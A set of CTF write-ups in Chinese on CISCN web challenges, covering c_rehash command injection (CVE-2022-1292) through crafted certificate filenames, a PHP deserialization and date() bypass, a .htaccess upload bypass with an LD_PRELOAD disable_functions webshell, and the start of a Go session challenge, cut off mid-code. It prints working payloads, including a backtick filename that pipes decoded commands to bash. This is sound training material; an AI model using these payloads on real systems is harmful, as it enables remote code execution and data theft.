<p>首先在main函数中。如果访问/路由，则调用index函数；如果访问/admin/rename，则调用admin函数</p>
<p>其中index函数就单纯返回一个字符串；admin函数中首先获取旧的以及新的名字，随后判断其是否为空且字符串中是否包含<code>..</code>防止目录穿越；如果正常的话，接着判断url路径如果不是空，且host为admin则成功执行rename进行名字的更替。</p>
<p>题目中出现了 c_rehash，c_rehash是openssl中的一个用perl编写的脚本工具，用于批量创建证书等文件 hash命名的符号链接，c_rehash 有个命令注入漏洞 (<a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-qjmp-vmxc-7p8r">CVE-2022-1292</a>)，经过搜索网上并没有公开的exp (可能因为这个漏洞非常鸡肋)，只能通过diff进行分析</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302103834036.png" alt="image-20240302103834036"></p>
<p>这里看不懂代码，看了wp之后说这里的fname没有进行过滤反引号就直接拼接到了上述箭头处的命令中，这意味着如果我们构造一个含有反引号的文件名，即可进行rce。</p>
<p>根据上述的分析以及wp我们可以有个思路，首先就是访问/getcrt获取证书以及文件名，随后就是要构造我们需要进行rce的文件名了，如果构造好并成功执行admin函数之后，我们直接访问createlink路由，其中info函数会通过popen执行我们的文件名，造成rce（ c_rehash 作用是让openssl在证书目录中能够找到证书）</p>
<pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">hash_dir</span> </span>{
    <span class="hljs-keyword">my</span> %hashlist;
    <span class="hljs-keyword">print</span> <span class="hljs-string">"Doing $_[0]\n"</span>;
    <span class="hljs-comment">#将当前目录切换到参数 $_[0] 指定的目录。</span>
    <span class="hljs-keyword">chdir</span> $_[<span class="hljs-number">0</span>];
    <span class="hljs-comment">#使用 opendir 打开目录，并读取该目录下的文件列表，使用 readdir 获取文件列表并按字母顺序排序</span>
    <span class="hljs-keyword">opendir</span>(DIR, <span class="hljs-string">"."</span>);
    <span class="hljs-keyword">my</span> @flist = <span class="hljs-keyword">sort</span> <span class="hljs-keyword">readdir</span>(DIR);
    <span class="hljs-keyword">closedir</span> DIR;
    <span class="hljs-comment">#如果 $removelinks 变量为真，则删除符号链接文件。</span>
    <span class="hljs-keyword">if</span> ( $removelinks ) {
        <span class="hljs-comment"># Delete any existing symbolic links</span>
        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">grep</span> {<span class="hljs-regexp">/^[\da-f]+\.r{0,1}\d+$/</span>} @flist) {
            <span class="hljs-keyword">if</span> (-l $_) {
                <span class="hljs-keyword">print</span> <span class="hljs-string">"unlink $_"</span> <span class="hljs-keyword">if</span> $verbose;
                <span class="hljs-keyword">unlink</span> $_ || <span class="hljs-keyword">warn</span> <span class="hljs-string">"Can't unlink $_, $!\n"</span>;
            }
        }
    }
    <span class="hljs-comment">#对于符合特定文件名模式（以 .pem、.crt、.cer、.crl 结尾）的文件，调用 check_file 子例程检查文件内容是否符合证书或 CRL 格式。</span>
    FILE: <span class="hljs-keyword">foreach</span> $fname (<span class="hljs-keyword">grep</span> {<span class="hljs-regexp">/\.(pem)|(crt)|(cer)|(crl)$/</span>} @flist) {
        <span class="hljs-comment"># Check to see if certificates and/or CRLs present.</span>
        <span class="hljs-keyword">my</span> ($cert, $crl) = check_file($fname);
        <span class="hljs-keyword">if</span> (!$cert &amp;&amp; !$crl) {
            <span class="hljs-keyword">print</span> STDERR <span class="hljs-string">"WARNING: $fname does not contain a certificate or CRL: skipping\n"</span>;
            <span class="hljs-keyword">next</span>;
        }
        link_hash_cert($fname) <span class="hljs-keyword">if</span> ($cert);<span class="hljs-comment">#如果文件包含证书，则调用 link_hash_cert 子例程处理证书。</span>
        link_hash_crl($fname) <span class="hljs-keyword">if</span> ($crl);<span class="hljs-comment">#如果文件包含 CRL，则调用 link_hash_crl 子例程处理 CRL。</span>
    }
}</code></pre>
<h2 id="利用条件">利用条件</h2>
<ol>
<li>执行c_rehash 目标目录下文件可控</li>
<li>文件后缀符合要求</li>
<li>文件内容必须包含证书或者是吊销列表</li>
<li>文件名可控</li>
</ol>
<p>题目中生成证书的功能可以创建一个满足要求的文件</p>
<p>这里要实现文件名可控，重点就是go中的rename函数了，要调用该函数，首先需要绕过</p>
<p><code>if c.Request.URL.RawPath != "" &amp;&amp; c.Request.Host == "admin"</code></p>
<p>这里先看一个go语言URI.URL结构体（找不到原文章，借用师傅的图了）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302104834951.png" alt="image-20240302104834951"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302104841760.png" alt="image-20240302104841760"></p>
<p>也就是说url中必须含有待转移的字符，也就是经过url编码的字符，<a target="_blank" rel="noopener" href="https://rce.moe/2022/05/30/c-rehash-CVE-2022-1292-ciscn-2022-online-crt/">具体也可参考该文章解释</a></p>
<p>接下来先访问getcrt获取证书文件名：static/crt/39d205a5-79c2-4f06-936c-8adb7f06c6b2.crt</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302105135582.png" alt="image-20240302105135582"></p>
<p>接着请求 /proxy 修改证书名为恶意文件名，这里放一些师傅们说的坑点：</p>
<p>linux文件名虽然可以包含大部分可打印字符，但是有一个除外 那就是斜杠，不能使用斜杠这限制了命令执行的内容</p>
<p>这里有位师傅做的是原环境：他当时选择了base64编码以及截断环境变量方式，但由于目标环境的限制无法成功；接着他就使用现有的环境变量</p>
<p>他通过<code>env&gt;qweqwe</code>命令在之后下载的文件看到了有一个变量值为/，接着变成功读取到了（这里就记录一下这种思路）</p>
<pre><code class="hljs scss">uri=/admin%<span class="hljs-number">2</span>frename?oldname=<span class="hljs-number">39</span>d205a5-<span class="hljs-number">79</span>c2-<span class="hljs-number">4</span>f06-<span class="hljs-number">936</span>c-<span class="hljs-number">8</span>adb7f06c6b2<span class="hljs-selector-class">.crt</span>&amp;newname=`ls%<span class="hljs-number">20</span>${OLDPWD}&gt;yghj`<span class="hljs-selector-class">.crt</span></code></pre>
<p>这里我使用的是nssctf的环境，根据wp所述，这里使用base64方法即可</p>
<p>payload为：</p>
<pre><code class="hljs scss">uri=/admin%<span class="hljs-number">2</span>frename?oldname=<span class="hljs-number">39</span>d205a5-<span class="hljs-number">79</span>c2-<span class="hljs-number">4</span>f06-<span class="hljs-number">936</span>c-<span class="hljs-number">8</span>adb7f06c6b2<span class="hljs-selector-class">.crt</span>&amp;newname=`echo%<span class="hljs-number">20</span>Y2F0IC8qIA==|base64%<span class="hljs-number">20</span><span class="hljs-attr">--decode</span>|bash&gt;flag<span class="hljs-selector-class">.txt</span>`<span class="hljs-selector-class">.crt</span></code></pre>
<p>这里需要将/url编码，空格编码接着继续将payload整体进行url编码。因为<code>return data.decode()</code>的存在</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib.parse
uri = <span class="hljs-string">'''/admin%2frename?oldname=a1fdda8f-fbf7-42fd-9092-2d849967c6b5.crt&amp;newname=`echo%20Y2F0IC8qIA==|base64%20--decode|bash&gt;flag.txt`.crt HTTP/1.1</span>
<span class="hljs-string">Host: admin</span>
<span class="hljs-string">'''</span>
gopher = uri.replace(<span class="hljs-string">"\n"</span>,<span class="hljs-string">"\r\n"</span>)
payload = urllib.parse.quote(gopher)
<span class="hljs-built_in">print</span>(payload)</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302112648852.png" alt="image-20240302112648852"></p>
<p>这里我们访问createlink触发上述代码的执行，之后访问/static/crt/flag.txt即可拿到flag（static目录可读）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302112701521.png" alt="image-20240302112701521"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302112722938.png" alt="image-20240302112722938"></p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://rce.moe/2022/05/30/c-rehash-CVE-2022-1292-ciscn-2022-online-crt/">第15届全国大学生信息安全竞赛 online_crt writeup c_rehash(CVE-2022-1292) ciscn 2022</a></p>
<p><a target="_blank" rel="noopener" href="https://miaotony.xyz/2022/05/31/CTF_2022CISCN_preliminary/#toc-heading-4">CTF | 2022 CISCN 初赛 WriteUp</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0xo0Kerk/p/17204958.html">[CISCN 2022 初赛]online_crt</a></p>
<h1 id="ciscn-2023-华北ez_date">[CISCN 2023 华北]ez_date</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b)){
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'no array'</span>);
        }
        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) ){
            <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);
            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">'.txt'</span>;
            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);
            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/((\s)*(\n)+(\s)*)/i'</span>,<span class="hljs-string">''</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));
            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);
        }
        <span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">die</span>();
        }
    }
}

<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'code'</span>]));</code></pre>
<p>简单的反序列化，这里的正则表达式的作用就是将文件内容中所有连续的空格、换行和空白字符替换为空字符串。重点就是绕过第二个if语句。</p>
<p>这里的第一个if条件语句让我们无法通过数据绕过下面的md5强等，看了wp说可以利用数字和字符来绕过</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302144515978.png" alt="image-20240302144515978"></p>
<p>另一个是date函数的绕过：date函数会对特定的字母转化为特定的时间表达格式</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302144636962.png" alt="image-20240302144636962"></p>
<p>因此构造payload如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;
}

<span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">date</span>();
<span class="hljs-variable">$pop</span>-&gt;a = <span class="hljs-string">'1'</span>;
<span class="hljs-variable">$pop</span>-&gt;b = <span class="hljs-number">1</span>;
<span class="hljs-variable">$pop</span>-&gt;file = <span class="hljs-string">"/f\l\a\g"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>));

<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302144953252.png" alt="image-20240302144953252"></p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_73668856/article/details/134893842">（反序列化）小记录</a></p>
<h1 id="ciscn-2023-西南do_you_like_read">[CISCN 2023 西南]do_you_like_read</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302153843422.png" alt="image-20240302153843422"></p>
<p>点击登陆之后，根据提示用户名是admin，这里可以进行密码爆破，当然运气好直接弱口令：admin123即可登录</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302153949857.png" alt="image-20240302153949857"></p>
<p>进去之后可以发现含有文件上传，文件编辑以及删除等功能，我们先尝试文件上传，但由于这是白盒审计，我们先看看上传文件代码如何写</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'image'</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'image'</span>][<span class="hljs-string">'name'</span>] != <span class="hljs-string">""</span>) {
    <span class="hljs-variable">$image</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'image'</span>][<span class="hljs-string">'name'</span>];
    <span class="hljs-comment">// 检查文件名的扩展名是否已经是".php"</span>
    <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$image</span>, PATHINFO_EXTENSION);
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$ext</span>) == <span class="hljs-string">'php'</span>|| <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$ext</span>) == <span class="hljs-string">'phtml'</span> || <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$ext</span>) == <span class="hljs-string">'php5'</span> || <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$ext</span>) == <span class="hljs-string">'php2'</span>) {
        <span class="hljs-comment">// 将文件名的扩展名替换为".jpg"</span>
        <span class="hljs-variable">$image</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$image</span>, PATHINFO_FILENAME) . <span class="hljs-string">'.jpg'</span>;
    }
    <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$ext</span>) != <span class="hljs-string">'jpg'</span>) {
        <span class="hljs-comment">// 忽略其他后缀名并不做修改</span>
        <span class="hljs-variable">$image</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'image'</span>][<span class="hljs-string">'name'</span>];
    }
    <span class="hljs-variable">$directory_self</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'PHP_SELF'</span>]), <span class="hljs-string">''</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'PHP_SELF'</span>]);
    <span class="hljs-variable">$uploadDirectory</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'DOCUMENT_ROOT'</span>] . <span class="hljs-variable">$directory_self</span> . <span class="hljs-string">"bootstrap/img/"</span>;
    <span class="hljs-variable">$uploadDirectory</span> .= <span class="hljs-variable">$image</span>;
    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'image'</span>][<span class="hljs-string">'tmp_name'</span>], <span class="hljs-variable">$uploadDirectory</span>);
}</code></pre>
<p>重点就是上面这一块儿，这里的代码逻辑就是：黑名单限制我们的文件后缀，然后就不管了，其余的任何文件后缀都认为是正确的。那我们肯定就能利用.htaccess来进行文件上传了，文件内容如下：</p>
<pre><code class="hljs scss">&lt;FilesMatch "<span class="hljs-number">1</span><span class="hljs-selector-class">.jpg</span>"&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;</code></pre>
<p>这里指定的文件名可以随便，上传之后会发现没有权限去读取flag。这里就靠wp了，他们做这道题都是线下awd的模式，因此他们直接先是用自动化工具审计了一下：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302155435429.png" alt="image-20240302155435429"></p>
<p>我们可以看到第三个箭头处的似乎是一个后门文件（对我这个小白来说我不知道为何后门文件直接就在源码里）</p>
<p>我们根据路径看一下该文件，</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;

    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"cmd"</span>];
    <span class="hljs-variable">$out_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"outpath"</span>];
    <span class="hljs-variable">$evil_cmdline</span> = <span class="hljs-variable">$cmd</span> . <span class="hljs-string">" &gt; "</span> . <span class="hljs-variable">$out_path</span> . <span class="hljs-string">" 2&gt;&amp;1"</span>;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . <span class="hljs-variable">$evil_cmdline</span> . <span class="hljs-string">"&lt;/p&gt;"</span>;

    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">"EVIL_CMDLINE="</span> . <span class="hljs-variable">$evil_cmdline</span>);

    <span class="hljs-variable">$so_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"sopath"</span>];
    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">"LD_PRELOAD="</span> . <span class="hljs-variable">$so_path</span>);

    <span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">""</span>, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>);

    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . <span class="hljs-title function_ invoke__">nl2br</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$out_path</span>)) . <span class="hljs-string">"&lt;/p&gt;"</span>; 

    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$out_path</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里给出GPT对该文件内容的解释</p>
<pre><code class="hljs scss">这段 PHP 代码实现了一个简单的利用 LD_PRELOAD 绕过 disable_functions 的方法。具体来说，它的功能是执行一个命令，并将命令的输出重定向到指定文件中，然后再读取该文件的内容并显示出来。下面是代码的详细解析：

<span class="hljs-number">1</span>. 第一行通过 GET 请求接收三个参数：cmd（要执行的命令）、outpath（输出文件路径）和 sopath（要加载的共享库路径）。

<span class="hljs-number">2</span>. 接下来将接收到的 cmd 参数和 outpath 参数拼接成一个命令行字符串 evil_cmdline，其中包括将命令的输出重定向到指定文件的部分。

<span class="hljs-number">3</span>. 使用 putenv 函数将 EVIL_CMDLINE 环境变量设置为 evil_cmdline。这样在后续的 mail 函数调用中，mail 函数会在执行时加载 EVIL_CMDLINE 环境变量中的命令。

<span class="hljs-number">4</span>. 将接收到的 sopath 参数设置为 LD_PRELOAD 环境变量，以加载共享库文件。这个共享库文件通常用于重载系统调用，以实现特定功能，比如绕过 disable_functions。

<span class="hljs-number">5</span>. 调用 mail 函数发送一封空邮件。由于在设置 LD_PRELOAD 环境变量后调用 mail 函数，因此 mail 函数在执行时会加载 LD_PRELOAD 环境变量中指定的共享库，从而执行设置的命令。

<span class="hljs-number">6</span>. 最后通过读取输出文件的内容，并以 <span class="hljs-selector-tag">HTML</span> 格式显示出来。同时使用 unlink 函数删除输出文件，以保证安全性。

这段代码的主要目的是演示利用 LD_PRELOAD 和重定向输出来绕过 PHP 的 disable_functions 的方法，同时也展示了一个非常不安全的代码实现。</code></pre>
<p>结合上述PHP文件我们能知道payload为：不过这里的路径与nssctf环境下不一致，需要做出修改</p>
<pre><code class="hljs scss">echo "&lt;<span class="hljs-selector-tag">p</span>&gt; &lt;<span class="hljs-selector-tag">b</span>&gt;example&lt;/<span class="hljs-selector-tag">b</span>&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;<span class="hljs-string">";</span>
<span class="hljs-string">//</span>
<span class="hljs-string">echo "</span>&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/app/bootstrap/test/bypass_disablefunc_x64.so &lt;/p&gt;<span class="hljs-string">";</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240302160351776.png" alt="image-20240302160351776"></p>
<p>这里的flag在环境变量中</p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44640313/article/details/131757347">2023西南赛区ciscn – do you like read</a></p>
<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/06/13/ciscn%E8%A5%BF%E5%8D%97%E5%A4%8D%E8%B5%9Bawdp-web/">CISCN西南复赛AWDPlus Web</a></p>
<h1 id="ciscn-2023-初赛go_session">[CISCN 2023 初赛]go_session</h1>
<h2 id="前置说明">前置说明</h2>
<p>这里借用师傅对该试题框架的说明</p>
<p>下载题目的附件，是用go的gin框架写的后端，cookie-session是由gorilla/sessions来实现，而sessions库使用了另一个库：gorilla/securecookie来实现对cookie的安全传输。这里所谓的安全传输，是指保证cookie中的值不能被看出来（通过加密实现，可选）、保证传输的cookie不会被篡改。</p>
<p>securecookie的编码函数一共有四个主要步骤来实现这一目的：</p>
<ul>
<li>序列化，cookie的值可以有多种形式，首先将其序列化为字节切片，方便后续操作。</li>
<li>加密（这一步是可选的），使用指定的对称加密方法、加密密钥，进行对value进行加密。</li>
<li>计算MAC值，以保证不被篡改，这里的MAC是Message Authentication Code的缩写。如何计算呢，通过指定的哈希函数来计算，对上述的加密后的value求一个摘要。</li>
<li>base64编码，当解密时，反过来即可，因为上述用于加密的方法与加密密钥、用于认证的哈希方法与哈希密钥，都是在服务器端设置的。准确来说就是由这个securecookie库的SecureCookie接口所规定的，通过加密密钥与认证密钥，保证了cookie不会被解密、不会被篡改的两个目的。</li>
</ul>
<h2 id="代码审计">代码审计</h2>
<p>main.go</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"github.com/gin-gonic/gin"</span>
	<span class="hljs-string">"main/route"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	r := gin.Default()
	r.GET(<span class="hljs-string">"/"</span>, route.Index)
